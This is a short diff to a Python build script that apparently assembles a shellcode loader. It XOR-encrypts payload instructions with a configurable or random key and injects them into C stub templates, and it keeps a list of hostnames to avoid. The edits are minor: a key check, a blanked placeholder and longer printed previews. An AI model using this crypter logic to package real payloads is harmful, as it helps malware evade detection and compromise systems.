@@ -30,7 +30,7 @@ WORKING_FOLDER = "temp/"
 
 def main():
 
-    if "rand" in config.get("Payload", "encryption_key"):
+    if config.get("Payload", "encryption_key") == "random":
         ENCRYPTION_KEY = generate_high_entropy_int(0x1111, 0xFFFF)
     else:
         ENCRYPTION_KEY = int(config.get("Payload", "encryption_key"),16)
@@ -87,7 +87,7 @@ def main():
                         sed_file(WORKING_FOLDER+filename, tag, res[:-1])
                         print("Avoid hostnames: ", AVOID_HOSTNAME)
                     else:
-                        sed_file(WORKING_FOLDER+filename, tag, "{0, 0, false}")
+                        sed_file(WORKING_FOLDER+filename, tag, "") # {0, 0, false}
 
 
     if PAYLOAD_FILE.endswith(".bin") or PAYLOAD_FILE.endswith(".raw"):
@@ -114,10 +114,10 @@ def main():
         sed_file(WORKING_FOLDER+STUB_FILE, "%SHELLCODE_DECODER%", "DICT_decrypt(dict_payload);")
     
     else:
-        print(instructions[:10]+"...")
+        print(instructions[:32]+"...")
         print(f"\nEncrypted with '{hex(ENCRYPTION_KEY)}' {int(len(instructions)/2)} bytes of instructions\n")
         encrypted_instructions = xor2_encrypt_decrypt(instructions, ENCRYPTION_KEY)
-        print(encrypted_instructions[:10]+"...")
+        print(encrypted_instructions[:32]+"...")
 
         sed_file("temp/definitions.h", "%PAYLOAD_SIZE%", str(int(len(instructions)/2)))
         sed_file("temp/payload.c", "%SHELLCODE%", f"unsigned char payload[] = \"{format_instructions(encrypted_instructions)}\";")
